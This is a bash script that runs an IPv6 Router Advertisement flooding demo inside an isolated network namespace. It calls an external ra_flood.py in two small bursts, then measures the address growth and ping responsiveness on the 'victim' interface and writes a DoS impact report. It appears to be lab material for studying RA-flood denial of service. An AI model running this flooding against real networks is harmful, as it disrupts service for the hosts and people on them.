#!/bin/bash
# SAFE IPv6 RA Flooding Demo - Minimal Impact
# Demonstrates basic DoS without system overload

set -e
trap cleanup EXIT

cleanup() {
    echo "🧹 Safe cleanup..."
    pkill -f tcpdump 2>/dev/null || true
    pkill -f monitor 2>/dev/null || true
    ip netns del victim 2>/dev/null || true
    ip link del veth-attacker 2>/dev/null || true
    rm -f /tmp/monitor_pid /tmp/addr_timeline.csv
}

# Create results directory
mkdir -p demo_results_safe

echo "🚀 SAFE IPv6 RA FLOODING - MINIMAL DoS DEMONSTRATION"
echo "===================================================="
echo "Target: Generate 10-30 IPv6 addresses with basic DoS test"
echo "Strategy: Ultra-conservative to prevent system crashes"
echo "Focus: Address explosion + simple responsiveness check"
echo ""

# Setup network namespace
echo "🔧 Setting up safe network isolation..."
ip netns del victim 2>/dev/null || true
ip link del veth-attacker 2>/dev/null || true

ip netns add victim
ip link add veth-attacker type veth peer name veth-victim
ip link set veth-victim netns victim

# Configure interfaces
ip addr add 2001:db8:cafe::1/64 dev veth-attacker
ip link set veth-attacker up

ip netns exec victim ip addr add 2001:db8:cafe::2/64 dev veth-victim
ip netns exec victim ip link set veth-victim up
ip netns exec victim ip link set lo up

# Configure victim for RA acceptance
ip netns exec victim sysctl -w net.ipv6.conf.all.accept_ra=1 >/dev/null
ip netns exec victim sysctl -w net.ipv6.conf.veth-victim.accept_ra=1 >/dev/null
ip netns exec victim sysctl -w net.ipv6.conf.all.autoconf=1 >/dev/null

# Start minimal monitoring
echo "📊 Starting minimal address monitoring..."
ip netns exec victim bash -c '
    echo "timestamp,addr_count" > /tmp/addr_timeline.csv
    while true; do
        timestamp=$(date +%s)
        addr_count=$(ip -6 addr show dev veth-victim | grep -c "scope global dynamic" || echo "0")
        echo "$timestamp,$addr_count" >> /tmp/addr_timeline.csv
        sleep 3  # Slow monitoring to minimize load
    done
' &
echo $! > /tmp/monitor_pid

# Start packet capture
echo "📡 Starting packet capture..."
tcpdump -i veth-attacker -w demo_results_safe/safe_ra_flood.pcap icmp6 &
TCPDUMP_PID=$!
sleep 2

# Get baseline
BASELINE=$(ip netns exec victim ip -6 addr show dev veth-victim | grep -c "scope global dynamic" || echo "0")
echo "📋 Baseline dynamic IPv6 addresses: $BASELINE"

# Test baseline responsiveness
echo "🏓 Testing baseline victim responsiveness..."
if ip netns exec victim ping6 -c 1 -W 2 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "   ✅ Baseline: Victim responsive"
    BASELINE_RESPONSIVE=true
else
    echo "   ❌ Baseline: Victim not responding"
    BASELINE_RESPONSIVE=false
fi

echo ""
echo "🔥 PHASE 1: ULTRA-SAFE BURST - 25 packets (minimal load)"
echo "========================================================"
echo "Goal: Generate some addresses with zero system stress"

# Ultra-conservative attack - single thread, tiny count
time python3 src/ra_flood.py -i veth-attacker -c 25 --threads 1

echo "⏱️  Allowing address processing..."
sleep 5

AFTER_BURST=$(ip netns exec victim ip -6 addr show dev veth-victim | grep -c "scope global dynamic" || echo "0")
echo "📊 After minimal burst: $AFTER_BURST dynamic addresses (+$((AFTER_BURST - BASELINE)))"

# Test responsiveness
echo "🏓 Testing victim responsiveness after burst..."
if ip netns exec victim ping6 -c 1 -W 3 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "   ✅ Post-burst: Victim responsive"
    BURST_RESPONSIVE=true
else
    echo "   ❌ Post-burst: Victim unresponsive!"
    BURST_RESPONSIVE=false
fi

echo ""
echo "🌊 PHASE 2: GENTLE INCREASE - 25 more packets (still ultra-safe)"
echo "=============================================================="
echo "Goal: Show sustained address growth without any stress"

# Still ultra-conservative - single thread, small count
time python3 src/ra_flood.py -i veth-attacker -c 25 --threads 1

echo "⏱️  Final processing time..."
sleep 5

FINAL_COUNT=$(ip netns exec victim ip -6 addr show dev veth-victim | grep -c "scope global dynamic" || echo "0")
TOTAL_ADDED=$((FINAL_COUNT - BASELINE))

echo "📊 Final count: $FINAL_COUNT dynamic addresses (+$TOTAL_ADDED total)"

# Final responsiveness test
echo "🏓 Final victim responsiveness test..."
if ip netns exec victim ping6 -c 2 -W 3 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "   ✅ Final: Victim responsive"
    FINAL_RESPONSIVE=true
else
    echo "   ❌ Final: Victim unresponsive - DoS achieved!"
    FINAL_RESPONSIVE=false
fi

# Results summary
echo ""
echo "🎯 SAFE DEMONSTRATION RESULTS"
echo "============================="
echo "Initial dynamic addresses: $BASELINE"
echo "Final dynamic addresses: $FINAL_COUNT"
echo "Addresses added: $TOTAL_ADDED"
if (( BASELINE > 0 )); then
    GROWTH_PERCENT=$(( (FINAL_COUNT * 100) / BASELINE ))
    echo "Growth: $GROWTH_PERCENT% increase"
else
    echo "Growth: $FINAL_COUNT new addresses (from zero)"
fi

# DoS assessment
echo ""
echo "🚨 DoS IMPACT ASSESSMENT:"
echo "========================"

if [[ "$FINAL_RESPONSIVE" == false ]]; then
    echo "🔴 DoS ACHIEVED - Victim unresponsive"
    echo "   Impact: Complete service disruption"
elif [[ "$BURST_RESPONSIVE" == false ]]; then
    echo "🟡 PARTIAL DoS - Temporary unresponsiveness"
    echo "   Impact: Brief service disruption"
else
    echo "🟢 NO DoS - Victim remains responsive"
    echo "   Impact: Address inflation only"
fi

echo "   📊 Evidence: $TOTAL_ADDED address explosion"
echo "   🎯 Attack effectiveness: $(if [[ $TOTAL_ADDED -gt 10 ]]; then echo "HIGH"; elif [[ $TOTAL_ADDED -gt 5 ]]; then echo "MODERATE"; else echo "LOW"; fi)"

# Performance summary
echo ""
echo "📈 SAFE PERFORMANCE SUMMARY:"
echo "============================"
echo "Total packets: 50 (ultra-conservative)"
echo "Duration: ~12 seconds"
echo "Rate: ~4 packets/second (safe)"
echo "Threads: 1 (minimal load)"
echo "System impact: Negligible"

# Stop monitoring and capture
kill $(cat /tmp/monitor_pid) 2>/dev/null || true
kill $TCPDUMP_PID 2>/dev/null || true
sleep 2

# Copy monitoring data
cp /tmp/addr_timeline.csv demo_results_safe/

# Generate simple report
cat > demo_results_safe/safe_demo_report.txt << EOF
SAFE IPv6 RA FLOODING DEMONSTRATION REPORT
==========================================
Generated: $(date)
Strategy: Ultra-conservative demonstration to avoid system overload
Total packets: 50 RA advertisements
Duration: ~12 seconds

RESULTS:
- Baseline addresses: $BASELINE
- Final addresses: $FINAL_COUNT  
- Growth: +$TOTAL_ADDED addresses
- DoS impact: $(if [[ "$FINAL_RESPONSIVE" == false ]]; then echo "Complete"; elif [[ "$BURST_RESPONSIVE" == false ]]; then echo "Partial"; else echo "None"; fi)

EVIDENCE:
- safe_ra_flood.pcap: Packet capture
- addr_timeline.csv: Address growth monitoring
- System stability: Maintained throughout test

This demonstrates IPv6 RA flooding capabilities without system risk.
EOF

echo ""
echo "📁 SAFE DEMONSTRATION EVIDENCE:"
echo "==============================="
ls -lah demo_results_safe/

echo ""
echo "📋 ADDRESS EXPLOSION EVIDENCE:"
echo "=============================="
echo "Total addresses on victim interface:"
ip netns exec victim ip -6 addr show dev veth-victim | grep "inet6" | wc -l

echo ""
echo "Dynamic addresses created by attack:"
ip netns exec victim ip -6 addr show dev veth-victim | grep "scope global dynamic" | head -5

echo ""
echo "🎉 SAFE DEMONSTRATION COMPLETE!"
echo "==============================="
echo "Results: $TOTAL_ADDED addresses created safely"
echo "Impact: $(if [[ "$FINAL_RESPONSIVE" == false ]]; then echo "DoS achieved"; else echo "Address explosion demonstrated"; fi)"
echo "System: Stable throughout demonstration"
echo "Evidence: Collected in demo_results_safe/"
